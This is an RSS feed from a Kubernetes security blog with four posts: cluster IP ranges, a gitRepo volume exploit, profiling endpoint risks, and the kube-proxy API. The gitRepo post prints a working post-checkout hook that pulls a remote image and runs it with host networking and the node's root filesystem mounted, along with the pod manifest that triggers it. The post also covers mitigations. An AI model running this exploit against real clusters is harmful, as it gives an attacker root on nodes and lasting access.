<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Raesene's Ramblings</title>
		<description>Things that occur to me</description>
		<link>https://raesene.github.io/</link>
		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>The Many IP Addresses of Kubernetes</title>
				<description>&lt;p&gt;When getting to grips with Kubernetes one of the more complex concepts to understand is … all the IP addresses! Even looking at a simple cluster setup, you’ll get addresses in multiple different ranges. So this is a quick post to walk through where they’re coming from and what they’re used for.&lt;/p&gt;

&lt;p&gt;Typically you can see at least three distinct ranges of IP addresses in a Kubernetes cluster, although this can vary depending on the distribution and container networking solution in place. Firstly there is the node network where the container, virtual machines or physical servers running the Kubernetes components are, then there is an overlay network where pods are assigned IP addresses and lastly another network range where Kubernetes services are located.&lt;/p&gt;

&lt;p&gt;We’ll start with a standard &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; cluster before talking about some other sources of IP address complexity. We’ll start by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster&lt;/code&gt; to get it up and running.&lt;/p&gt;

&lt;p&gt;Once we’ve got the cluster started we can see what IP address the node has by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec -it kind-control-plane ip addr show dev eth0&lt;/code&gt; . The output of that command should look something like this&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;13: eth0@if14: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default 
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fc00:f853:ccd:e793::2/64 scope global nodad 
       valid_lft forever preferred_lft forever
    inet6 fe80::42:acff:fe12:2/64 scope &lt;span class=&quot;nb&quot;&gt;link 
       &lt;/span&gt;valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the address assigned is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.2/16&lt;/code&gt;, which is a network controlled by Docker (as we’re running our cluster on top of Docker). If you have a Virtual machine or physical server the IP addresses will be in whatever range is assigned to the network(s) the host has.&lt;/p&gt;

&lt;p&gt;So far, so simple. Now lets add a workload to our cluster and see what addresses are assigned there. Let’s start a webserver workload with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl run webserver --image=nginx&lt;/code&gt;. Once that pod starts we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get pods webserver -o wide&lt;/code&gt; to see what IP address has been assigned to the pod.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NAME        READY   STATUS    RESTARTS   AGE   IP           NODE                 NOMINATED NODE   READINESS GATES
webserver   1/1     Running   0          42s   10.244.0.5   kind-control-plane   &amp;lt;none&amp;gt;           &amp;lt;none&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our pod has an IP address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.244.0.5&lt;/code&gt; which is in an entirely different subnet! This IP address is part of the overlay network that most (but not all) Kubernetes distributions use for their workloads. This subnet is generally automatically assigned by the Kubernetes &lt;a href=&quot;https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/network-plugins/&quot;&gt;network plugin&lt;/a&gt; used in the cluster, so it’ll change based on the plugin in use and any specific configuration for that plugin. What’s happening here is that our Kubernetes node has created an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;veth&lt;/code&gt; interface for our pod and assigned that address to it. We can see the pod IP addresses from the hosts perspective by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec kind-control-plane ip route&lt;/code&gt; and we can see the IP addresses assigned to the different pods in the cluster, including the IP address we saw from our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get pods&lt;/code&gt; command above.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;default via 172.18.0.1 dev eth0 
10.244.0.2 dev veth9ee91973 scope host 
10.244.0.3 dev veth1b82cd96 scope host 
10.244.0.4 dev veth38302a10 scope host 
10.244.0.5 dev vethf915cecb scope host 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we’ve got the node network and the pod network, let’s see what happens if we add a Kubernetes &lt;a href=&quot;https://kubernetes.io/docs/concepts/services-networking/service/&quot;&gt;service&lt;/a&gt; to the mix. We can do this by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl expose pod webserver --port 8080&lt;/code&gt; which will create a service object for our webserver pod. There are several types of service object, but by default a ClusterIP service will be created, which provides an IP address which is visible inside the cluster, but not outside it. Once our service is created we can look at the IP address by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get services webserver&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NAME        TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE
webserver   ClusterIP   10.96.198.83   &amp;lt;none&amp;gt;        8080/TCP   97s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see from the output that the IP address is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.198.83&lt;/code&gt; another IP address range! This range is set by a command line flag on the Kubernetes API server. In the case of our kind cluster, it looks like this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--service-cluster-ip-range=10.96.0.0/16&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;But from a host perspective, where does this IP address fit in. Well the reality of Kubernetes service objects is that, by default, they’re iptables rules created by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-proxy&lt;/code&gt; service on the node. We can see our webserver service by running this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec kind-control-plane iptables -t nat -L KUBE-SERVICES -v -n --line-numbers&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Chain KUBE-SERVICES (2 references)
num   pkts bytes target     prot opt in     out     source               destination         
1        1    60 KUBE-SVC-NPX46M4PTMTKRN6Y  6    --  *      *       0.0.0.0/0            10.96.0.1            /* default/kubernetes:https cluster IP */ tcp dpt:443
2        0     0 KUBE-SVC-UMJOY2TYQGVV2BKY  6    --  *      *       0.0.0.0/0            10.96.198.83         /* default/webserver cluster IP */ tcp dpt:8080
3        0     0 KUBE-SVC-TCOU7JCQXEZGVUNU  17   --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:dns cluster IP */ udp dpt:53
4        0     0 KUBE-SVC-ERIFXISQEP7F7OF4  6    --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53
5        0     0 KUBE-SVC-JD5MR3NA4I4DYORP  6    --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:metrics cluster IP */ tcp dpt:9153
6     7757  465K KUBE-NODEPORTS  0    --  *      *       0.0.0.0/0            0.0.0.0/0            /* kubernetes service nodeports; NOTE: this must be the last rule in this chain */ ADDRTYPE match dst-type LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The goal of this post was just to explore a couple of concepts. Firstly, the variety of IP addresses you’re likely to see in a Kubernetes cluster and then how those tie to the operating system level.&lt;/p&gt;

</description>
				<pubDate>Fri, 01 Nov 2024 08:00:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</guid>
			</item>
		
			<item>
				<title>Fun With GitRepo Volumes</title>
				<description>&lt;p&gt;On Monday this week I noticed a new and really interesting blog from &lt;a href=&quot;https://x.com/ImreRad&quot;&gt;Imre Rad&lt;/a&gt;. The &lt;a href=&quot;https://irsl.medium.com/sneaky-write-hook-git-clone-to-root-on-k8s-node-e38236205d54&quot;&gt;Blog Post&lt;/a&gt; described an unpatched issue in Kubernetes, which allows any user with the ability to create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to execute code on the underlying host as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user! For the details of how this works, please read Imre’s blog as all the cool research is his, I’m just looking at how it might be exploited :)&lt;/p&gt;

&lt;h2 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h2&gt;

&lt;p&gt;So the first thing to check is, what do I need to be in place for this issue to be exploited. First up we need the &lt;a href=&quot;https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo&quot;&gt;gitRepo&lt;/a&gt; volume type to be available. This has been deprecated since Kubernetes 1.11, which is a long time ago, but critically it’s not been removed from Kubernetes. In my experiments so far I’ve not found a single distribution that didn’t support it, so that’s good.&lt;/p&gt;

&lt;p&gt;Next up, we need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary to be present on the node, as this volume type directly uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary. From what I’ve seen so far this is a pretty common configuration, with GKE standard, AKS, and RKE all having it present. A default EKS install didn’t but of course I’d guess it could be added if a cluster admin found they needed it. It also wasn’t present in KinD cluster by default, so for my demo I had to add it :D&lt;/p&gt;

&lt;p&gt;The last part of the puzzle is user rights. The user who exploits this needs to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; rights on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; and also not be blocked from using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume type. That volume type is not blocked in &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/pod-security-standards/&quot;&gt;baseline PSS&lt;/a&gt; (at the moment), but isn’t allowed in the restricted profile, so it’s possible this wouldn’t work, but I’d guess quite a few clusters don’t block it.&lt;/p&gt;

&lt;h2 id=&quot;exploiting-the-vulnerability&quot;&gt;Exploiting the vulnerability&lt;/h2&gt;

&lt;p&gt;So now we know what we need, what can we do with this? Well I was wondering if I could do something based on my earlier research on &lt;a href=&quot;https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/&quot;&gt;Using Tailscale for persistence&lt;/a&gt;, and create a pod that automatically joins a Tailnet as a bot.&lt;/p&gt;

&lt;p&gt;To do this we’ll need a Docker image that, when run, starts Tailscale and joins the network. That could be kind of risky as we’ll need to embed an Auth key, but fortunately Tailscale provides &lt;a href=&quot;https://tailscale.com/kb/1085/auth-keys#types-of-auth-keys&quot;&gt;one-off&lt;/a&gt; auth keys that will only function a single time. Also we can use Tailscale ACLs to ensure that when a victim joins, they can’t actually reach anything else on the tailnet.&lt;/p&gt;

&lt;p&gt;Next we’ll need to modify Imre’s &lt;a href=&quot;https://github.com/irsl/g&quot;&gt;PoC&lt;/a&gt;. This turns out to be a lot more simple than I thought. Basically you just put any commands you want in the &lt;a href=&quot;https://github.com/raesene/repopodexploit/blob/main/hooks/post-checkout&quot;&gt;post-checkout&lt;/a&gt; script.&lt;/p&gt;

&lt;p&gt;In my example I create a Containerd namespace, then pull my Tailscale joining image, and then run it with host networking, and mounting the host’s root filesystem into the container, which looks a bit like this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
ctr namespace create sys_net_mon
ctr -n sys_net_mon images pull docker.io/raesene/gitrepodemo:latest
ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/gitrepodemo:latest sys_net_mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we just need a manifest that has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume which references the repository with our script. For that we just modify Imre’s PoC with our forked repository.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Pod&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;test-pd&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;alpine:latest&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sleep&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;86400&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;test-container&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/gitrepo&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gitvolume&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gitvolume&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;gitRepo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;g/.git&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/raesene/repopodexploit.git&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pulling-it-all-together&quot;&gt;Pulling it all together&lt;/h2&gt;

&lt;p&gt;So what does this all look like when you run it. Well like most console exploits, not that fancy, but it does demonstrate how someone can go from having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; pod rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; on a node, in a single command.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/9IyowCL8Gd0?si=VkE0n8pDHNegZ1_s&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;preventing-this&quot;&gt;Preventing this!&lt;/h2&gt;

&lt;p&gt;So how do you stop this happening to your cluster. There is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/124531&quot;&gt;PR&lt;/a&gt; that Imre wrote to fix this. At the moment that’s looking like it will be added to all supported versions of Kubernetes (back to 1.28).&lt;/p&gt;

&lt;p&gt;Until that patched version is in place, you can use admission control to block the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; Volume types. If you have access to ValidatingAdmissionPolicy, then there’s a CEL expression in the &lt;a href=&quot;https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo&quot;&gt;volume description&lt;/a&gt;. Alternatively it should be possible to block this with other common admission control solutions.&lt;/p&gt;

&lt;p&gt;A hack fix would be to remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary from your nodes, but that’s not really a great solution…&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is an interesting issue, as it’s not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!&lt;/p&gt;
</description>
				<pubDate>Wed, 10 Jul 2024 18:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</guid>
			</item>
		
			<item>
				<title>Taking a look at Kubernetes Profiling</title>
				<description>&lt;p&gt;Debugging facilities can always be interesting for attackers, and in general for security, so I decided to take a look at Kubernetes support for Profiling, and where it could be a risk to cluster security. We’ll start with a little bit of background info.&lt;/p&gt;

&lt;h2 id=&quot;golang-profiling&quot;&gt;Golang profiling&lt;/h2&gt;

&lt;p&gt;Google provides a library called &lt;a href=&quot;https://github.com/google/pprof&quot;&gt;pprof&lt;/a&gt; that can be embedded in Golang applications to expose profiling information for debugging applications. This allows programs to expose the profiling information via a web server and also provides tools that can visualise and analyse that information.&lt;/p&gt;

&lt;p&gt;If you have a program which exposes the pprof information you can then connect to it and start a program to analyse the exposed information. For example if we want to connect to a profiling service at  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:8001/debug/pprof/profile&lt;/code&gt;, we’d run&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go tool pprof &lt;span class=&quot;nt&quot;&gt;-http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:8080 http://localhost:8001/debug/pprof/profile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and it would give us something like this :-&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/pprof-web.png&quot; alt=&quot;pprof web&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From there we can get performance flame graphs and other useful debugging information.&lt;/p&gt;

&lt;h2 id=&quot;kubernetes-and-profiling&quot;&gt;Kubernetes and profiling&lt;/h2&gt;

&lt;p&gt;Where this becomes interesting for Kubernetes is that, by default, Kubernetes enables profiling in the API server, scheduler, controller-manager, and Kubelet. Kube-proxy is the odd one out here, I’m not entirely sure why but one guess would be that as the kube-proxy API doesn’t support authentication (more on that &lt;a href=&quot;https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/&quot;&gt;here&lt;/a&gt;) it wasn’t considered safe to add this functionality to it.&lt;/p&gt;

&lt;p&gt;So for each of the APIs that Kubernetes presents you can access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/debug/pprof/profile&lt;/code&gt; endpoint to get access to this profiling information (and some other functionality discussed in the next section).&lt;/p&gt;

&lt;p&gt;Access to this information is not available without credentials and you’ll need access to this path via whatever authorization system(s) you’ve got configured in your clusters. For Kubernetes RBAC, access for kube-apiserver, kube-controller-manager, and kube-scheduler is managed via non-resource endpoints, so typically you’d need to explicitly grant access to that (or be a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cluster-admin&lt;/code&gt; of course).&lt;/p&gt;

&lt;p&gt;For the Kubelet, somewhat confusingly, it’s gated under the catch-all access of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node/proxy&lt;/code&gt;, so any users with rights to that resource in your cluster will be able to get access to the profiling information.&lt;/p&gt;

&lt;h2 id=&quot;dynamic-log-level-changing&quot;&gt;Dynamic log level changing&lt;/h2&gt;

&lt;p&gt;There’s also another piece of functionality which is associated with Kubernetes use of profiling, which is the ability to dynamically change the log level of the service remotely. Anyone with access to the profiling endpoints can issue a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PUT&lt;/code&gt; request to change the servers log level. So for example if you’ve got a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl proxy&lt;/code&gt; running to your cluster on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8001&lt;/code&gt;, this command would change the API server’s log level to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10&lt;/code&gt; which is the DEBUG level.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; PUT http://127.0.0.1:8001/debug/flags/v &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;is-this-really-a-risk&quot;&gt;Is this really a risk?&lt;/h2&gt;

&lt;p&gt;So of course the question is, is any of this actually a risk from a security standpoint and, like most things in security, the answer is “it depends”. As the profiling information is gated behind authentication and authorization not just anyone can get access, however there are some scenarios where this is a specific risk.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Managed Kubernetes&lt;/strong&gt;. For managed clusters, users who have admin level access to cluster resources are still meant to be restricted from directly accessing the control plane which is managed by the provider. So any managed Kubernetes providers who haven’t disabled this on their cluster are at risk of attackers accessing the information. One of the more interesting scenarios where this is relevant, is if the cluster operators can see the Kubernetes API server logs, as it could allow them to exploit &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/104720&quot;&gt;CVE-2020-8561&lt;/a&gt;, and start using malicious webhooks to probe the providers network more effectively.&lt;/p&gt;

&lt;p&gt;Additionally there’s a denial of service risk here for managed providers in that you can do things like start application traces which use control plane node resources. Also it’s &lt;em&gt;possible&lt;/em&gt; that sensitive information could be included in traces, although I’ve not seen any direct evidence of that in the looking around I’ve done so far.&lt;/p&gt;

&lt;p&gt;For other clusters, there’s possibly some risk in that users with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node/proxy&lt;/code&gt; rights can increase the Kubelet’s log level and access that information, but that’s probably a bit more situational.&lt;/p&gt;

&lt;h2 id=&quot;how-do-i-disable-profiling-in-kubernetes&quot;&gt;How do I disable profiling in Kubernetes?&lt;/h2&gt;

&lt;p&gt;If you want to disable profiling in your clusters, and really in production clusters it shouldn’t be enabled, you can do it via command line flags or config files. The kube-apiserver, kube-controller-manager, and kube-scheduler all use a parameter called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profiling&lt;/code&gt;, but the Kubelet manages it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enableDebuggingHandlers&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Kubernetes profiling is another interesting part of the API which can be relevant for security. For production clusters, it’s an unusual choice to have it enabled by default, and probably something that should just be disabled, unless you explicitly need it.&lt;/p&gt;
</description>
				<pubDate>Tue, 18 Jun 2024 12:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/</guid>
			</item>
		
			<item>
				<title>Taking a look at the Kube-Proxy API</title>
				<description>&lt;p&gt;Kubernetes has got a number of different components, each with it’s own API. Whilst most of the time you’ll interact with the main kube-apiserver API, and sometimes the Kubelet API, the other ones can have some interesting properties. The kube-proxy API is interesting, in that it has some differences from all the others.&lt;/p&gt;

&lt;p&gt;The API is split into two separate components, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;healthz&lt;/code&gt; API and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metrics&lt;/code&gt; API. The healthz API, which listens on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0:10256&lt;/code&gt; by default is extremely simple, having one endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/healthz&lt;/code&gt;. It doesn’t have any option for authentication, so you just request that endpoint and you get a response (N.B. Like a lot of Kubernetes APIs if you request the root path you’ll get a 404).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:10256/healthz
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lastUpdated&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2024-06-16 13:10:38.185046097 +0000 UTC m=+18599.921395918&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;currentTime&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2024-06-16 13:10:38.185046097 +0000 UTC m=+18599.921395918&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;nodeEligible&quot;&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The response is kind of interesting as it provides some time and other metadata, unlike the other components which just return a flat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ok&lt;/code&gt; to requests to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;healthz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metrics&lt;/code&gt; API has a default bind address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:10249&lt;/code&gt; and has some more interesting endpoints available. Unlike other APIs in Kubernetes, there’s no authentication option for this service so anyone who can reach it, can access any endpoint. Also note that the bind address being localhost is a distribution choice. For example Amazon EKS binds this service to all interfaces (after reporting this to them I was told this is by design and pointed at &lt;a href=&quot;https://github.com/aws/containers-roadmap/issues/657&quot;&gt;this GitHub issue&lt;/a&gt;).&lt;/p&gt;

